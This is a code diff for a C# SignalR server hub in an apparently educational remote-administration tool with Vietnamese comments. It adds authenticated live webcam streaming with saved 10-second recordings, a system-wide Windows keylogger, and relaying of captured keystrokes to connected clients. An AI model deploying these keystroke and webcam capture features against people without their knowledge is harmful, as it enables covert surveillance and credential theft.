@@ -10,6 +10,7 @@ using System.Net.Http;
 using System.Text;
 using System.Text.Json;
 using Microsoft.Extensions.Configuration;
+using System.Net;
 
 
 namespace Server.Hubs
@@ -18,6 +19,8 @@ namespace Server.Hubs
     {
         private readonly SystemService _systemService;
         private readonly WebcamService _webcamService;
+        private readonly WebcamStreamManager _webcamStreamManager;
+        private readonly WebcamProofStore _webcamProofStore;
         private readonly InputService _inputService;
         private readonly IHubContext<ControlHub> _hubContext;
         // [THÊM] Dịch vụ xác thực
@@ -26,6 +29,8 @@ namespace Server.Hubs
         public ControlHub(
             SystemService systemService, 
             WebcamService webcamService, 
+            WebcamStreamManager webcamStreamManager,
+            WebcamProofStore webcamProofStore,
             InputService inputService,
             IHubContext<ControlHub> hubContext,
             AuthService authService // [THÊM] Inject AuthService
@@ -33,6 +38,8 @@ namespace Server.Hubs
         {
             _systemService = systemService;
             _webcamService = webcamService;
+            _webcamStreamManager = webcamStreamManager;
+            _webcamProofStore = webcamProofStore;
             _inputService = inputService;
             _hubContext = hubContext;
             _authService = authService; // [THÊM] Gán AuthService
@@ -41,6 +48,10 @@ namespace Server.Hubs
         // --- XỬ LÝ KẾT NỐI VÀ NGẮT KẾT NỐI ---
         public override async Task OnConnectedAsync()
         {
+            // Auto-auth via token (to survive reconnects)
+            var token = Context.GetHttpContext()?.Request.Query["access_token"].ToString();
+            _authService.TryAuthenticateWithToken(Context.ConnectionId, token);
+
             // [SỬA] Gửi status chung, sau đó check trạng thái Auth
             await Clients.Caller.SendAsync("ReceiveStatus", StatusType.Auth, true, "Kết nối SignalR thành công.");
             await GetServerStatus(); 
@@ -51,6 +62,7 @@ namespace Server.Hubs
         {
             // [THÊM] Xóa phiên khi người dùng ngắt kết nối
             _authService.Logout(Context.ConnectionId);
+            await StopKeyLogSessionInternal(Context.ConnectionId);
             await base.OnDisconnectedAsync(exception);
         }
 
@@ -88,6 +100,27 @@ namespace Server.Hubs
             await Clients.Caller.SendAsync("ReceiveServerStatus", status); 
         }
 
+        // Poll-only variant (avoid spamming status bar).
+        public async Task GetServerStatusSilent()
+        {
+            string status;
+
+            if (_authService.IsAuthenticated(Context.ConnectionId))
+            {
+                status = ConnectionStatus.Authenticated;
+            }
+            else if (_authService.IsRegistrationAllowed(Context.ConnectionId))
+            {
+                status = ConnectionStatus.RegistrationRequired;
+            }
+            else
+            {
+                status = ConnectionStatus.LoginRequired;
+            }
+
+            await Clients.Caller.SendAsync("ReceiveServerStatus", status);
+        }
+
         /// <summary>
         /// Xử lý Master Setup Code
         /// </summary>
@@ -111,24 +144,28 @@ namespace Server.Hubs
         /// </summary>
         public async Task RegisterUser(string username, string password)
         {
-            if (!_authService.IsRegistrationAllowed(Context.ConnectionId))
+            var result = await _authService.TryRegisterAsync(Context.ConnectionId, username, password);
+            if (result != AuthService.RegisterResult.Success)
             {
-                await Clients.Caller.SendAsync("ReceiveStatus", StatusType.Auth, false, ErrorMessages.RegistrationNotAllowed);
+                var msg = result switch
+                {
+                    AuthService.RegisterResult.NotAllowed => ErrorMessages.RegistrationNotAllowed,
+                    AuthService.RegisterResult.GrantExpired => ErrorMessages.RegistrationExpired,
+                    AuthService.RegisterResult.UsernameTaken => ErrorMessages.UsernameTaken,
+                    AuthService.RegisterResult.InvalidUsername => ErrorMessages.InvalidUsername,
+                    AuthService.RegisterResult.InvalidPassword => ErrorMessages.InvalidPassword,
+                    _ => ErrorMessages.RegistrationFailed
+                };
+
+                await Clients.Caller.SendAsync("ReceiveStatus", StatusType.Auth, false, msg);
+                if (result is AuthService.RegisterResult.NotAllowed or AuthService.RegisterResult.GrantExpired)
+                    await Clients.Caller.SendAsync("ReceiveServerStatus", ConnectionStatus.LoginRequired);
                 return;
             }
-            
-            if (await _authService.TryRegisterAsync(Context.ConnectionId, username, password))
-            {
-                // Đăng ký thành công, tự động đăng nhập và chuyển sang Dashboard
-                _authService.TryAuthenticate(Context.ConnectionId, username, password); 
-                await Clients.Caller.SendAsync("ReceiveStatus", StatusType.Auth, true, $"Đăng ký thành công tài khoản: {username}.");
-                await Clients.Caller.SendAsync("ReceiveServerStatus", ConnectionStatus.Authenticated);
-            }
-            else
-            {
-                 // Lỗi có thể do tên người dùng đã tồn tại
-                await Clients.Caller.SendAsync("ReceiveStatus", StatusType.Auth, false, ErrorMessages.UsernameTaken);
-            }
+
+            // Đăng ký thành công, tự động đăng nhập và chuyển sang Dashboard
+            await Clients.Caller.SendAsync("ReceiveStatus", StatusType.Auth, true, $"Đăng ký thành công tài khoản: {username}. Vui lòng đăng nhập.");
+            await Clients.Caller.SendAsync("ReceiveServerStatus", ConnectionStatus.LoginRequired);
         }
 
         /// <summary>
@@ -138,6 +175,10 @@ namespace Server.Hubs
         {
             if (_authService.TryAuthenticate(Context.ConnectionId, username, password))
             {
+                var token = _authService.IssueToken(username);
+                if (!string.IsNullOrEmpty(token))
+                    await Clients.Caller.SendAsync("ReceiveAuthToken", token);
+
                 await Clients.Caller.SendAsync("ReceiveStatus", StatusType.Auth, true, $"Đăng nhập thành công, chào mừng {username}.");
                 await Clients.Caller.SendAsync("ReceiveServerStatus", ConnectionStatus.Authenticated);
             }
@@ -145,6 +186,14 @@ namespace Server.Hubs
             {
                 await Clients.Caller.SendAsync("ReceiveStatus", StatusType.Auth, false, ErrorMessages.InvalidCredentials);
             }
+        }
+
+        public async Task Logout()
+        {
+            _authService.Logout(Context.ConnectionId);
+            await StopKeyLogSessionInternal(Context.ConnectionId);
+            await Clients.Caller.SendAsync("ReceiveStatus", StatusType.Auth, true, "Đã đăng xuất.");
+            await Clients.Caller.SendAsync("ReceiveServerStatus", ConnectionStatus.LoginRequired);
         }
 
 
@@ -195,49 +244,121 @@ namespace Server.Hubs
             await Clients.Caller.SendAsync("ReceiveImage", "SCREENSHOT", image);
         }
 
-        // [GIỮ NGUYÊN LOGIC CŨ CỦA BẠN] Lệnh: Mở Webcam -> Quay 10s -> Gửi về -> Giữ cam mở
-        // [CẢNH BÁO: LOGIC NÀY KHÔNG PHẢI LIVE STREAM]
-        public async Task RequestWebcam()
+        // Live webcam + record proof first 10 seconds.
+        public async Task StartWebcamLive(int fps = 10)
         {
             if (!_authService.IsAuthenticated(Context.ConnectionId)) return; // [AUTH CHECK]
-            
-            await Clients.Caller.SendAsync("ReceiveStatus", "WEBCAM", true, "Đang quay video 10 giây...");
+
+            var connectionId = Context.ConnectionId;
+
+            if (_webcamStreamManager.IsActive(connectionId))
+            {
+                await Clients.Caller.SendAsync("ReceiveStatus", "WEBCAM", true, "Webcam đang chạy.");
+                return;
+            }
+
+            await Clients.Caller.SendAsync("ReceiveStatus", "WEBCAM", true, "Đang bật webcam live + ghi bằng chứng 10s đầu...");
+
+            var ok = await _webcamStreamManager.StartAsync(
+                connectionId,
+                fps,
+                TimeSpan.FromSeconds(10),
+                async (frame, ct) =>
+                {
+                    await _hubContext.Clients.Client(connectionId).SendAsync("ReceiveImage", "WEBCAM_LIVE", frame, ct);
+                },
+                async (meta) =>
+                {
+                    await _hubContext.Clients.Client(connectionId).SendAsync("ReceiveStatus", "WEBCAM", true, $"Đã lưu bằng chứng 10s đầu: {meta.Id}");
+                    var list = _webcamProofStore.List();
+                    var json = JsonHelper.ToJson(list);
+                    await _hubContext.Clients.Client(connectionId).SendAsync("ReceiveWebcamProofList", json);
+                },
+                Context.ConnectionAborted);
+
+            await Clients.Caller.SendAsync("ReceiveStatus", "WEBCAM", ok, ok ? "Webcam live đã bắt đầu." : "Không thể bật webcam live.");
+        }
+
+        public async Task StopWebcamLive()
+        {
+            if (!_authService.IsAuthenticated(Context.ConnectionId)) return; // [AUTH CHECK]
+
+            var connectionId = Context.ConnectionId;
+            await Clients.Caller.SendAsync("ReceiveStatus", "WEBCAM", true, "Đang tắt webcam (sẽ lưu bằng chứng ngay)...");
+
+            _ = Task.Run(async () =>
+            {
+                try
+                {
+                    var meta = await _webcamStreamManager.StopAndSaveAsync(connectionId, CancellationToken.None);
+                    if (meta == null)
+                    {
+                        await _hubContext.Clients.Client(connectionId).SendAsync("ReceiveStatus", "WEBCAM", true, "Webcam đã tắt (không có bằng chứng).");
+                    }
+                    else
+                    {
+                        await _hubContext.Clients.Client(connectionId).SendAsync("ReceiveStatus", "WEBCAM", true, $"Đã lưu bằng chứng: {meta.Id} ({meta.FrameCount} frames).");
+                    }
+
+                    var list = _webcamProofStore.List();
+                    var json = JsonHelper.ToJson(list);
+                    await _hubContext.Clients.Client(connectionId).SendAsync("ReceiveWebcamProofList", json);
+                }
+                catch
+                {
+                    // ignore
+                }
+            }, CancellationToken.None);
+        }
+
+        public async Task GetWebcamProofList()
+        {
+            if (!_authService.IsAuthenticated(Context.ConnectionId)) return; // [AUTH CHECK]
+            await SendWebcamProofList();
+        }
+
+        public async Task PlayWebcamProof(string proofId)
+        {
+            if (!_authService.IsAuthenticated(Context.ConnectionId)) return; // [AUTH CHECK]
+
+            if (string.IsNullOrWhiteSpace(proofId))
+            {
+                await Clients.Caller.SendAsync("ReceiveStatus", "WEBCAM", false, "Chưa chọn bằng chứng.");
+                return;
+            }
 
             var token = Context.ConnectionAborted;
-
-            try
+            var frames = await _webcamProofStore.LoadFramesAsync(proofId, token);
+            if (frames.Count == 0)
             {
-                // Gọi Service để quay (chờ khoảng 3s)
-                var frames = await _webcamService.RequestWebcam(10, token);
-
-                if (frames == null || frames.Count == 0)
-                {
-                    await Clients.Caller.SendAsync("ReceiveStatus", "WEBCAM", false, "Lỗi: Không quay được frame nào (Cam lỗi hoặc bị chiếm).");
-                    return;
-                }
-
-                await Clients.Caller.SendAsync("ReceiveStatus", "WEBCAM", true, $"Đang gửi {frames.Count} khung hình...");
-
-                // Gửi từng frame về Client
-                foreach (var frame in frames)
-                {
-                    await Clients.Caller.SendAsync("ReceiveImage", "WEBCAM_FRAME", frame);
-                    // Delay nhẹ để Client kịp hiển thị (tạo cảm giác như đang phát video)
-                    await Task.Delay(100); 
-                }
-                
-                await Clients.Caller.SendAsync("ReceiveStatus", "WEBCAM", true, "Đã gửi xong video.");
+                await Clients.Caller.SendAsync("ReceiveStatus", "WEBCAM", false, "Không tìm thấy bằng chứng.");
+                return;
             }
-            catch (Exception ex)
+
+            await Clients.Caller.SendAsync("ReceiveStatus", "WEBCAM", true, $"Đang phát bằng chứng {proofId} ({frames.Count} frames)...");
+            foreach (var frame in frames)
             {
-                await Clients.Caller.SendAsync("ReceiveStatus", "WEBCAM", false, "Lỗi Server: " + ex.Message);
+                await Clients.Caller.SendAsync("ReceiveImage", "WEBCAM_PROOF_FRAME", frame, token);
+                await Task.Delay(100, token);
             }
+            await Clients.Caller.SendAsync("ReceiveStatus", "WEBCAM", true, "Phát xong bằng chứng.");
+        }
+
+        private Task SendWebcamProofList()
+        {
+            var list = _webcamProofStore.List();
+            var json = JsonHelper.ToJson(list);
+            return Clients.Caller.SendAsync("ReceiveWebcamProofList", json);
+        }
+
+        // Back-compat: old buttons call these.
+        public async Task RequestWebcam()
+        {
+            await StartWebcamLive(10);
         }
         public async Task CloseWebcam()
         {
-            if (!_authService.IsAuthenticated(Context.ConnectionId)) return; // [AUTH CHECK]
-            _webcamService.closeWebcam();
-            await Clients.Caller.SendAsync("ReceiveStatus", "WEBCAM", true, "Đã đóng Webcam.");
+            await StopWebcamLive();
         }
 
         // --- NHÓM 3: KEYLOGGER (INPUT) ---
@@ -248,33 +369,73 @@ namespace Server.Hubs
             
             string connectionId = Context.ConnectionId;
             
-            _inputService.StartKeyLogger((keyData) => 
-            {
-                // Fire-and-forget - không await
-                _ = Task.Run(async () =>
-                {
-                    try
-                    {
-                        await _hubContext.Clients.Client(connectionId).SendAsync("ReceiveKeyLog", keyData);
-                    }
-                    catch
-                    {
-                        // Bỏ qua lỗi network
-                    }
-                });
-                
-                return Task.CompletedTask;
-            });
+            _inputService.StartKeyLoggerSession(connectionId);
+            await Clients.Caller.SendAsync("ReceiveKeyLog", "\n--- keylog session enabled ---\n");
 
-            await Clients.Caller.SendAsync("ReceiveStatus", "KEYLOG", true, "Keylogger đã bắt đầu.");
+            // Windows: thử bật global keylogger (SharpHook). macOS/Linux: dùng trang /server-keycapture (tab phải focus).
+            if (OperatingSystem.IsWindows())
+            {
+                await _inputService.StartKeyLogger((keyData) => RelayKeyLog(keyData));
+                await Clients.Caller.SendAsync("ReceiveStatus", "KEYLOG", true, "Keylogger hệ thống đã bật.");
+                return;
+            }
+
+            await Clients.Caller.SendAsync("ReceiveStatus", "KEYLOG", true, "Bật keylog (JS). Trên máy Server mở /server-keycapture và bấm Enable (tab phải focus).");
         }
 
         public async Task StopKeyLogger()
         {
             if (!_authService.IsAuthenticated(Context.ConnectionId)) return; // [AUTH CHECK]
             
-            _inputService.StopKeyLogger();
+            await StopKeyLogSessionInternal(Context.ConnectionId);
+            await Clients.Caller.SendAsync("ReceiveKeyLog", "\n--- keylog session disabled ---\n");
             await Clients.Caller.SendAsync("ReceiveStatus", "KEYLOG", false, "Keylogger đã dừng.");
+        }
+
+        /// <summary>
+        /// Receive key-capture events from local server page (/server-keycapture).
+        /// This is NOT system-wide: only captures while the tab is focused.
+        /// </summary>
+        public async Task SendServerCapturedKey(string keyData)
+        {
+            var remoteIp = Context.GetHttpContext()?.Connection.RemoteIpAddress;
+            if (remoteIp == null)
+                return;
+            if (!IPAddress.IsLoopback(remoteIp) && !(remoteIp.IsIPv4MappedToIPv6 && IPAddress.IsLoopback(remoteIp.MapToIPv4())))
+                return;
+
+            if (string.IsNullOrWhiteSpace(keyData))
+                return;
+
+            await RelayKeyLog(keyData);
+        }
+
+        private async Task RelayKeyLog(string keyData)
+        {
+            var targets = _inputService.GetActiveKeyLoggerSessionConnectionIds();
+            if (targets.Count == 0) return;
+
+            var payload = keyData.Replace("\r\n", "\n");
+            foreach (var targetConnectionId in targets)
+            {
+                try
+                {
+                    await _hubContext.Clients.Client(targetConnectionId).SendAsync("ReceiveKeyLog", payload);
+                }
+                catch
+                {
+                    // ignore transient network errors
+                }
+            }
+        }
+
+        private async Task StopKeyLogSessionInternal(string connectionId)
+        {
+            _inputService.StopKeyLoggerSession(connectionId);
+            if (_inputService.ActiveKeyLoggerSessionCount == 0)
+            {
+                await _inputService.StopKeyLogger();
+            }
         }
 
     }
